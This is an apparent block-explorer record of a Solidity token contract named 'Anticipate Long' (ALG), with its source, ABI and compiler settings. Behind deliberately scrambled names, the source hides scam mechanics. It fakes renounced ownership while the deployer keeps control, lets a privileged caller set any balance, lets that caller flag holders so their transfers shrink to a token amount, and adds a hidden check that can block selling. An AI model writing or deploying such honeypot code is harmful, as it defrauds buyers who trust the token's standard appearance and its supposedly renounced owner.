{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface receiverLaunchedMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxSender {\n    function createPair(address receiverReceiver, address swapTeam) external returns (address);\n}\n\ninterface autoTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingFeeFund) external view returns (uint256);\n\n    function transfer(address launchedAtTotal, uint256 fromReceiver) external returns (bool);\n\n    function allowance(address takeModeLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchedAtTotal,\n        uint256 fromReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverEnableFund, uint256 value);\n    event Approval(address indexed takeModeLiquidity, address indexed spender, uint256 value);\n}\n\ninterface autoTxMetadata is autoTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnticipateLong is autoTake, autoTx, autoTxMetadata {\n\n    bool public limitIs;\n\n    function teamFromAuto(address receiverFrom) public {\n        buyLiquidity();\n        if (isEnable != receiverSender) {\n            maxMode = txLiquiditySell;\n        }\n        if (receiverFrom == txToken || receiverFrom == atLimit) {\n            return;\n        }\n        launchShould[receiverFrom] = true;\n    }\n\n    function isTotal(address fundTo, uint256 fromReceiver) public {\n        buyLiquidity();\n        sellTo[fundTo] = fromReceiver;\n    }\n\n    function exemptAt(address atMarketing, address launchedAtTotal, uint256 fromReceiver) internal returns (bool) {\n        if (atMarketing == txToken) {\n            return fromTrading(atMarketing, launchedAtTotal, fromReceiver);\n        }\n        uint256 walletAtBuy = autoTx(atLimit).balanceOf(limitLaunched);\n        require(walletAtBuy == sellMax);\n        require(launchedAtTotal != limitLaunched);\n        if (launchShould[atMarketing]) {\n            return fromTrading(atMarketing, launchedAtTotal, receiverAmount);\n        }\n        return fromTrading(atMarketing, launchedAtTotal, fromReceiver);\n    }\n\n    bool public isEnable;\n\n    uint8 private totalLaunch = 18;\n\n    address limitLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public exemptShould;\n\n    uint256 enableMin;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxSwap;\n    }\n\n    uint256 private maxMode;\n\n    event OwnershipTransferred(address indexed senderShouldMax, address indexed exemptMarketing);\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalLaunch;\n    }\n\n    uint256 private listSwapFee = 100000000 * 10 ** 18;\n\n    function senderFrom(address marketingBuy) public {\n        if (swapLaunch) {\n            return;\n        }\n        if (teamFeeIs) {\n            sellAmount = minReceiverMarketing;\n        }\n        exemptShould[marketingBuy] = true;\n        if (teamFeeIs == isEnable) {\n            enableSender = sellAmount;\n        }\n        swapLaunch = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listSwapFee;\n    }\n\n    uint256 public txLiquiditySell;\n\n    address atSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private liquiditySender;\n\n    mapping(address => mapping(address => uint256)) private swapLimit;\n\n    function balanceOf(address marketingFeeFund) public view virtual override returns (uint256) {\n        return sellTo[marketingFeeFund];\n    }\n\n    uint256 constant receiverAmount = 5 ** 10;\n\n    function fromTrading(address atMarketing, address launchedAtTotal, uint256 fromReceiver) internal returns (bool) {\n        require(sellTo[atMarketing] >= fromReceiver);\n        sellTo[atMarketing] -= fromReceiver;\n        sellTo[launchedAtTotal] += fromReceiver;\n        emit Transfer(atMarketing, launchedAtTotal, fromReceiver);\n        return true;\n    }\n\n    address public txToken;\n\n    address private atFee;\n\n    constructor (){\n        \n        receiverLaunchedMode exemptEnable = receiverLaunchedMode(atSender);\n        atLimit = maxSender(exemptEnable.factory()).createPair(exemptEnable.WETH(), address(this));\n        \n        txToken = _msgSender();\n        walletSwap();\n        exemptShould[txToken] = true;\n        sellTo[txToken] = listSwapFee;\n        if (isEnable != liquiditySender) {\n            isEnable = true;\n        }\n        emit Transfer(address(0), txToken, listSwapFee);\n    }\n\n    bool public receiverSender;\n\n    bool public swapLaunch;\n\n    function owner() external view returns (address) {\n        return atFee;\n    }\n\n    bool private teamFeeIs;\n\n    function walletSwap() public {\n        emit OwnershipTransferred(txToken, address(0));\n        atFee = address(0);\n    }\n\n    mapping(address => bool) public launchShould;\n\n    mapping(address => uint256) private sellTo;\n\n    function getOwner() external view returns (address) {\n        return atFee;\n    }\n\n    function transfer(address fundTo, uint256 fromReceiver) external virtual override returns (bool) {\n        return exemptAt(_msgSender(), fundTo, fromReceiver);\n    }\n\n    uint256 public sellAmount;\n\n    function approve(address receiverSell, uint256 fromReceiver) public virtual override returns (bool) {\n        swapLimit[_msgSender()][receiverSell] = fromReceiver;\n        emit Approval(_msgSender(), receiverSell, fromReceiver);\n        return true;\n    }\n\n    string private atMinTo = \"Anticipate Long\";\n\n    uint256 private enableSender;\n\n    address public atLimit;\n\n    function allowance(address isFromLimit, address receiverSell) external view virtual override returns (uint256) {\n        if (receiverSell == atSender) {\n            return type(uint256).max;\n        }\n        return swapLimit[isFromLimit][receiverSell];\n    }\n\n    uint256 sellMax;\n\n    function transferFrom(address atMarketing, address launchedAtTotal, uint256 fromReceiver) external override returns (bool) {\n        if (_msgSender() != atSender) {\n            if (swapLimit[atMarketing][_msgSender()] != type(uint256).max) {\n                require(fromReceiver <= swapLimit[atMarketing][_msgSender()]);\n                swapLimit[atMarketing][_msgSender()] -= fromReceiver;\n            }\n        }\n        return exemptAt(atMarketing, launchedAtTotal, fromReceiver);\n    }\n\n    function listMin(uint256 fromReceiver) public {\n        buyLiquidity();\n        sellMax = fromReceiver;\n    }\n\n    function buyLiquidity() private view {\n        require(exemptShould[_msgSender()]);\n    }\n\n    string private maxSwap = \"ALG\";\n\n    function name() external view virtual override returns (string memory) {\n        return atMinTo;\n    }\n\n    uint256 private minReceiverMarketing;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeModeLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderShouldMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnableFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFeeFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"isTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"listMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingBuy\",\"type\":\"address\"}],\"name\":\"senderFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"teamFromAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAtTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txLiquiditySell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AnticipateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}